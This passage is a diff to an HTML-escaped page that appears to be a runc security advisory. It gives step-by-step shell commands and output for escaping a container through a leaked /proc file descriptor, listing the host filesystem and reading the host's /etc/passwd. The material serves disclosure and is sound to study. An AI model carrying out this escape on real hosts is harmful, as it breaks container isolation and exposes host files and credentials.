+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;run container(sh) in shell1;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;/ #&lt;/p&gt;&lt;/li&gt;
+/ # 
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;run new container in shell2 with &amp;ldquo;runc exec&amp;rdquo; command. It is pausing 500sec;&lt;/p&gt;
 
@@ -509,54 +726,49 @@ e.fc25.x86_64.rpm&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p&gt;run &amp;ldquo;ps ax&amp;rdquo; in shell1. You can see shell2 process;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;/ # ps ax
+/ # ps ax
 PID   USER     TIME   COMMAND
     1 root       0:00 sh
     6 root       0:00 /proc/self/exe init
    11 root       0:00 ps ax
-/ #&lt;/p&gt;&lt;/li&gt;
+/ # 
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;In above case, check /proc/6/fd by ls command. You see path as fd/4;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;/ # ls -la /proc/6/fd/
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;total 0
-dr-x&amp;mdash;&amp;mdash;    2 root     root             0 Jan 16 06:43 .
+total 0
+dr-x------    2 root     root             0 Jan 16 06:43 .
 dr-xr-xr-x    9 root     root             0 Jan 16 06:43 ..
-lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 0 -&amp;gt; /dev/pts/4
-lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 1 -&amp;gt; /dev/pts/4
-lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 2 -&amp;gt; /dev/pts/4
-lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 3 -&amp;gt; socket:[40487]
-lr-x&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 4 -&amp;gt; /run/runc/ctr
-lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 5 -&amp;gt; /dev/pts/4
-lr-x&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 6 -&amp;gt; pipe:[40496]
-l-wx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 7 -&amp;gt; /dev/null
-/ #&lt;/p&gt;&lt;/li&gt;
+lrwx------    1 root     root            64 Jan 16 06:43 0 -&amp;gt; /dev/pts/4
+lrwx------    1 root     root            64 Jan 16 06:43 1 -&amp;gt; /dev/pts/4
+lrwx------    1 root     root            64 Jan 16 06:43 2 -&amp;gt; /dev/pts/4
+lrwx------    1 root     root            64 Jan 16 06:43 3 -&amp;gt; socket:[40487]
+lr-x------    1 root     root            64 Jan 16 06:43 4 -&amp;gt; /run/runc/ctr
+lrwx------    1 root     root            64 Jan 16 06:43 5 -&amp;gt; /dev/pts/4
+lr-x------    1 root     root            64 Jan 16 06:43 6 -&amp;gt; pipe:[40496]
+l-wx------    1 root     root            64 Jan 16 06:43 7 -&amp;gt; /dev/null
+/ # 
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
-&lt;li&gt;&lt;p&gt;Check &amp;ldquo;/proc/6/fd/4/../../..&amp;rdquo; by ls command. You can see parent(host) / file
-system;&lt;/p&gt;
+&lt;li&gt;&lt;p&gt;Check &amp;ldquo;/proc/6/fd/4/../../..&amp;rdquo; by ls command. You can see parent(host) / filesystem;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;/ # ls -l /proc/6/fd/4/../../..
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;total 64
+total 64
 lrwxrwxrwx    1 root     root             7 Feb  3  2016 bin -&amp;gt; usr/bin
 dr-xr-xr-x    6 root     root          4096 Jan 16 00:07 boot
 drwxr-xr-x   19 root     root          3840 Jan 16 05:57 dev
 drwxr-xr-x  130 root     root         12288 Jan 16 05:40 etc
-drwxr-xr-x    3 root     root          4096 Oct 12 22:55 home&lt;/p&gt;&lt;/li&gt;
+drwxr-xr-x    3 root     root          4096 Oct 12 22:55 home
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;You can also read /etc/passwd by using &amp;ldquo;cat /proc/6/fd/4/../../../etc&amp;rdquo;;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;/ # cat /proc/6/fd/4/../../../etc/passwd
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;root:x:0:0:root:/root:/bin/bash
+root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
-daemon:x:2:2:daemon:/sbin:/sbin/nologin&lt;/p&gt;&lt;/li&gt;
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;hr /&gt;
